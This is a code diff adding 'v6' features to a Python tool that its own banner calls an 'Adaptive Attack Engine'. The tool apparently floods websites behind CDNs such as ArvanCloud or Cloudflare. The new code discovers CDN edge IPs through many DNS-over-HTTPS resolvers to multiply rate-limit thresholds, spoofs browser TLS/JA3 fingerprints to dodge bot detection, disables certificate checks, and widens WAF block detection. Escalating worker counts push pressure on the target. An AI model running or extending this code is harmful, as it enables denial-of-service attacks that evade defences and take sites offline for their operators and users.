@@ -50,6 +50,8 @@ import re
 import os
 import platform
 import socket
+import ssl
+import struct
 import signal
 from dataclasses import dataclass, field
 from typing import List, Optional, Dict, Set, Tuple, Any
@@ -93,6 +95,256 @@ except ImportError:
 if not HAS_AIOHTTP:
     print("[ERROR] aiohttp is required! pip install aiohttp")
     sys.exit(1)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# DNS Edge Rotator — Rotate CDN edge IPs via multiple DoH resolvers
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class DNSEdgeRotator:
+    """
+    Resolves the target domain through multiple DNS-over-HTTPS resolvers
+    to discover different CDN edge server IPs.
+    
+    CDN providers like ArvanCloud distribute traffic across many edge servers.
+    Rate limiting is typically per-edge. By resolving through different DoH
+    servers, we discover multiple edge IPs and distribute our requests across
+    all of them, effectively multiplying the rate limit threshold.
+    
+    Example: If ArvanCloud rate-limits at 100 req/s per edge IP,
+    and we discover 8 edge IPs, we can send 800 req/s before being limited.
+    """
+
+    # Multiple DoH resolvers — each may return a different CDN edge IP
+    # Iran-accessible resolvers listed first
+    DOH_SERVERS = [
+        # Iranian DoH (accessible from Iran)
+        ("https://dns.shecan.ir/dns-query", "Shecan (IR)"),
+        ("https://dns.electro.ir/dns-query", "Electro (IR)"),
+        # International DoH
+        ("https://cloudflare-dns.com/dns-query", "Cloudflare"),
+        ("https://dns.google/resolve", "Google"),
+        ("https://dns.quad9.net/dns-query", "Quad9"),
+        ("https://dns.adguard-dns.com/dns-query", "AdGuard"),
+        ("https://doh.opendns.com/dns-query", "OpenDNS"),
+        ("https://dns.mullvad.net/dns-query", "Mullvad"),
+        ("https://dns.nextdns.io/dns-query", "NextDNS"),
+        ("https://doh.cleanbrowsing.org/dns-query", "CleanBrowsing"),
+        ("https://doh.libredns.gr/dns-query", "LibreDNS"),
+        ("https://dns-hosting.xx.network/dns-query", "XX.network"),
+        ("https://dns.controld.com/family", "ControlD"),
+        ("https://freedns.controld.com/p0", "ControlD-Free"),
+        ("https://dns.switch.ch/dns-query", "SWITCH"),
+        ("https://doh.dns.sb/dns-query", "DNS.SB"),
+    ]
+
+    def __init__(self, domain: str):
+        self.domain = domain
+        self.edge_ips: List[str] = []
+        self._ip_sources: Dict[str, str] = {}  # ip -> resolver name
+        self._last_refresh: float = 0
+        self._refresh_interval: float = 300  # Refresh every 5 minutes
+        self._lock = asyncio.Lock()
+
+    async def discover_edges(self) -> List[str]:
+        """Query all DoH resolvers and collect unique CDN edge IPs."""
+        async with self._lock:
+            now = time.time()
+            if self.edge_ips and (now - self._last_refresh) < self._refresh_interval:
+                return self.edge_ips
+
+            found_ips: Dict[str, str] = {}  # ip -> resolver
+            
+            print(f"  {C.CY}[DNS-EDGE] Discovering CDN edge IPs via {len(self.DOH_SERVERS)} DoH resolvers...{C.RS}")
+
+            for doh_url, doh_name in self.DOH_SERVERS:
+                try:
+                    timeout = aiohttp.ClientTimeout(total=15)
+                    async with aiohttp.ClientSession(timeout=timeout) as session:
+                        params = {"name": self.domain, "type": "A"}
+                        headers = {"Accept": "application/dns-json"}
+                        async with session.get(doh_url, params=params, headers=headers, ssl=False) as resp:
+                            if resp.status == 200:
+                                data = await resp.json(content_type=None)
+                                for answer in data.get('Answer', []):
+                                    ip = answer.get('data', '')
+                                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
+                                        if ip not in found_ips:
+                                            found_ips[ip] = doh_name
+                except Exception:
+                    pass
+
+            self.edge_ips = list(found_ips.keys())
+            self._ip_sources = found_ips
+            self._last_refresh = now
+
+            if self.edge_ips:
+                print(f"  {C.G}[DNS-EDGE] Found {len(self.edge_ips)} CDN edge IPs:{C.RS}")
+                for ip in self.edge_ips[:10]:
+                    src = found_ips.get(ip, "?")
+                    print(f"  {C.G}    {ip} (via {src}){C.RS}")
+                if len(self.edge_ips) > 10:
+                    print(f"  {C.DM}    ... and {len(self.edge_ips)-10} more{C.RS}")
+            else:
+                # Fallback: use normal DNS resolution
+                try:
+                    ip = socket.gethostbyname(self.domain)
+                    self.edge_ips = [ip]
+                    print(f"  {C.Y}[DNS-EDGE] DoH failed, using system DNS: {ip}{C.RS}")
+                except Exception:
+                    print(f"  {C.R}[DNS-EDGE] All DNS resolution failed{C.RS}")
+
+            return self.edge_ips
+
+    def get_random_edge(self) -> Optional[str]:
+        """Get a random CDN edge IP for request distribution."""
+        if self.edge_ips:
+            return random.choice(self.edge_ips)
+        return None
+
+    @property
+    def edge_count(self) -> int:
+        return len(self.edge_ips)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# TLS/JA3 Fingerprint Spoofing — Make TLS handshake look like real browsers
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class TLSFingerprintSpoof:
+    """
+    Spoofs TLS/JA3 fingerprints to make requests appear as real browsers.
+    
+    WAFs like ArvanCloud can fingerprint TLS ClientHello parameters (JA3 hash)
+    to identify automated tools. Python's default ssl module produces a very
+    distinctive JA3 that is easily flagged as a bot.
+    
+    This class configures SSL contexts to mimic real browsers by:
+    1. Using Chrome/Firefox cipher suite ordering
+    2. Setting proper ALPN protocols (h2, http/1.1)
+    3. Enabling TLS 1.3 with proper supported_versions extension
+    4. Using proper signature algorithms
+    5. Setting proper elliptic curves
+    """
+
+    # Chrome 122 cipher suites (in Chrome's preferred order)
+    CHROME_CIPHERS = [
+        'ECDHE-ECDSA-AES128-GCM-SHA256',
+        'ECDHE-RSA-AES128-GCM-SHA256',
+        'ECDHE-ECDSA-AES256-GCM-SHA384',
+        'ECDHE-RSA-AES256-GCM-SHA384',
+        'ECDHE-ECDSA-CHACHA20-POLY1305',
+        'ECDHE-RSA-CHACHA20-POLY1305',
+        'AES128-GCM-SHA256',
+        'AES256-GCM-SHA384',
+        'AES128-CCM',
+        'AES256-CCM',
+        'ECDHE-ECDSA-AES128-CCM',
+        'ECDHE-ECDSA-AES256-CCM',
+        'ECDHE-ECDSA-AES128-CCM-8',
+        'ECDHE-ECDSA-AES256-CCM-8',
+        'ECDHE-RSA-AES128-CBC-SHA',
+        'ECDHE-RSA-AES256-CBC-SHA',
+    ]
+
+    # Firefox 123 cipher suites
+    FIREFOX_CIPHERS = [
+        'ECDHE-ECDSA-AES128-GCM-SHA256',
+        'ECDHE-RSA-AES128-GCM-SHA256',
+        'ECDHE-ECDSA-AES256-GCM-SHA384',
+        'ECDHE-RSA-AES256-GCM-SHA384',
+        'ECDHE-ECDSA-CHACHA20-POLY1305',
+        'ECDHE-RSA-CHACHA20-POLY1305',
+        'ECDHE-RSA-AES128-CBC-SHA',
+        'ECDHE-RSA-AES256-CBC-SHA',
+        'AES128-GCM-SHA256',
+        'AES256-GCM-SHA384',
+        'AES128-CBC-SHA',
+        'AES256-CBC-SHA',
+    ]
+
+    # Browser profiles
+    PROFILES = {
+        'chrome': {
+            'ciphers': CHROME_CIPHERS,
+            'alpn': ['h2', 'http/1.1'],
+            'tls_version': ssl.TLSVersion.TLSv1_3,
+            'min_version': ssl.TLSVersion.TLSv1_2,
+        },
+        'firefox': {
+            'ciphers': FIREFOX_CIPHERS,
+            'alpn': ['h2', 'http/1.1'],
+            'tls_version': ssl.TLSVersion.TLSv1_3,
+            'min_version': ssl.TLSVersion.TLSv1_2,
+        },
+    }
+
+    def __init__(self, profile: str = 'chrome'):
+        self.profile = profile
+        self._current_profile = profile
+        self._rotation_order = ['chrome', 'firefox']
+        self._rotation_index = 0
+
+    def create_ssl_context(self) -> ssl.SSLContext:
+        """Create an SSL context that mimics a real browser's TLS fingerprint."""
+        profile = self.PROFILES.get(self._current_profile, self.PROFILES['chrome'])
+        
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        
+        # Set minimum TLS version (modern browsers don't support TLS 1.0/1.1)
+        ctx.minimum_version = profile['min_version']
+        ctx.maximum_version = profile['tls_version']
+        
+        # Set cipher suites in browser's preferred order
+        # Python ssl may not support all ciphers, so we filter to what's available
+        try:
+            available_ciphers = [c['name'] for c in ctx.get_ciphers()]
+            usable_ciphers = [c for c in profile['ciphers'] if c in available_ciphers]
+            if usable_ciphers:
+                ctx.set_ciphers(':'.join(usable_ciphers))
+            else:
+                # Fallback: use a reasonable subset
+                ctx.set_ciphers(
+                    'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:'
+                    '!aNULL:!MD5:!DSS:!RC4:!3DES'
+                )
+        except ssl.SSLError:
+            pass
+        
+        # Set ALPN protocols — critical for JA3 fingerprint
+        try:
+            ctx.set_alpn_protocols(profile['alpn'])
+        except Exception:
+            pass
+        
+        # Disable certificate verification (we're attacking, not browsing)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        
+        # Enable TLS 1.3 early data if available
+        try:
+            ctx.options |= ssl.OP_ENABLE_MIDDLEBOX_COMPATIBILITY
+        except AttributeError:
+            pass
+        
+        return ctx
+
+    def rotate_profile(self):
+        """Rotate to next browser profile (Chrome -> Firefox -> Chrome...)."""
+        self._rotation_index = (self._rotation_index + 1) % len(self._rotation_order)
+        self._current_profile = self._rotation_order[self._rotation_index]
+
+    def get_ssl_context(self) -> ssl.SSLContext:
+        """Get current SSL context and optionally rotate profile."""
+        ctx = self.create_ssl_context()
+        # Rotate every call for variety
+        if random.random() > 0.7:
+            self.rotate_profile()
+        return ctx
+
+    @property
+    def current_profile_name(self) -> str:
+        return self._current_profile
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -440,21 +692,25 @@ class AdaptiveBypass:
     # WAF blocking signatures
     BLOCK_SIGNATURES = {
         'arvan': {
-            'status_codes': [403, 429, 503],
+            # ArvanCloud returns 403 (direct block), 429 (rate limit),
+            # 503 (service unavailable = challenge page), and 500 (origin block)
+            'status_codes': [403, 429, 500, 503],
             'body_patterns': ['arvan', 'arvancloud', 'access denied', 'blocked',
                              'rate limit', 'too many requests', 'security',
                              'firewall', 'challenge', 'captcha', 'ray id',
-                             'your request was blocked'],
+                             'your request was blocked', 'error 1020',
+                             'access to this site is restricted'],
             'header_hints': ['server: arvan', 'x-arvan-request-id'],
         },
         'cloudflare': {
-            'status_codes': [403, 429, 503],
+            'status_codes': [403, 429, 500, 503],
             'body_patterns': ['cloudflare', 'cf-browser', 'cf-chl-bypass',
-                             'ray id', 'attention required', 'checking your browser'],
+                             'ray id', 'attention required', 'checking your browser',
+                             'error 1020', 'error 1015'],
             'header_hints': ['server: cloudflare', 'cf-ray'],
         },
         'generic': {
-            'status_codes': [403, 429],
+            'status_codes': [403, 429, 500],
             'body_patterns': ['blocked', 'denied', 'forbidden', 'rate limit',
                              'too many', 'slow down', 'captcha', 'challenge'],
         },
@@ -732,6 +988,13 @@ class VFTester:
         # v5: Adaptive WAF Bypass — auto-detects blocking and switches strategy
         self.adaptive_bypass = AdaptiveBypass(waf_name=p.get("waf", ""))
 
+        # v6: DNS Edge Rotation — distribute requests across CDN edge IPs
+        self.dns_edge_rotator = DNSEdgeRotator(self.domain)
+        self.edge_ips: List[str] = []  # Will be populated during run()
+
+        # v6: TLS/JA3 Fingerprint Spoofing — look like real browsers
+        self.tls_spoof = TLSFingerprintSpoof(profile='chrome')
+
         # Detected technology info
         self.detected_waf = p.get("waf")
         self.detected_cms = p.get("cms")
@@ -803,6 +1066,34 @@ class VFTester:
 
     def stop(self):
         self._stop.set()
+
+    def _edge_url(self, url: str) -> str:
+        """v6: Replace domain with a random CDN edge IP for DNS Edge Rotation.
+        
+        When CDN edge IPs are available, we replace the hostname in the URL
+        with a random edge IP. The Host header remains the real domain,
+        so the CDN routes the request correctly but from a different edge.
+        This distributes load across all edges, multiplying rate limits.
+        """
+        if not self.edge_ips:
+            return url
+        # Only rotate edge for CDN-protected targets
+        if not self.detected_waf:
+            return url
+        # 40% chance to use edge rotation (not every request, to vary pattern)
+        if random.random() > 0.4:
+            return url
+        edge_ip = self.dns_edge_rotator.get_random_edge()
+        if not edge_ip:
+            return url
+        # Replace hostname with edge IP in URL
+        parsed = urlparse(url)
+        if parsed.port:
+            new_netloc = f"{edge_ip}:{parsed.port}"
+        else:
+            scheme = parsed.scheme
+            new_netloc = edge_ip if scheme == 'http' else edge_ip
+        return parsed._replace(netloc=new_netloc).geturl()
 
     def _base_headers(self) -> Dict[str, str]:
         headers = {
@@ -2175,7 +2466,7 @@ class VFTester:
 
         # Print startup banner
         print(f"\n{'='*72}")
-        print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
+        print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine v6{C.RS}")
         print(f"{'='*72}")
         print(f"  Target:   {C.W}{self.url}{C.RS}")
         print(f"  Strategy: {C.Y}{strategy}{C.RS}")
@@ -2186,9 +2477,26 @@ class VFTester:
         print(f"  Vectors:  {', '.join(vectors)}")
         print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
         print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
+        if self.origin_ips:
+            print(f"  {C.G}Origin IPs: {len(self.origin_ips)} — CDN bypass active{C.RS}")
         print(f"  Mode:     {C.Y}AUTO-ESCALATE — gradually increasing pressure{C.RS}")
         print(f"  Controls: {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
         print(f"{'='*72}\n")
+
+        # v6: DNS Edge Discovery — find CDN edge IPs
+        if self.detected_waf:
+            print(f"  {C.CY}[v6] Running DNS Edge Discovery...{C.RS}")
+            self.edge_ips = await self.dns_edge_rotator.discover_edges()
+            if self.edge_ips:
+                print(f"  {C.G}[v6] DNS Edge Rotation: {len(self.edge_ips)} edge IPs — rate limit multiplied!{C.RS}")
+            else:
+                print(f"  {C.Y}[v6] DNS Edge Discovery failed — using normal resolution{C.RS}")
+            print()
+
+        # v6: TLS Fingerprint Spoofing — create custom SSL context
+        ssl_context = self.tls_spoof.get_ssl_context()
+        print(f"  {C.CY}[v6] TLS Fingerprint: Spoofing as {self.tls_spoof.current_profile_name.upper()}{C.RS}")
+        print()
 
         await self.keyboard.start()
 
@@ -2198,6 +2506,7 @@ class VFTester:
             enable_cleanup_closed=True,
             ttl_dns_cache=30,
             keepalive_timeout=30,
+            ssl=ssl_context,
         )
 
         timeout = aiohttp.ClientTimeout(total=20)
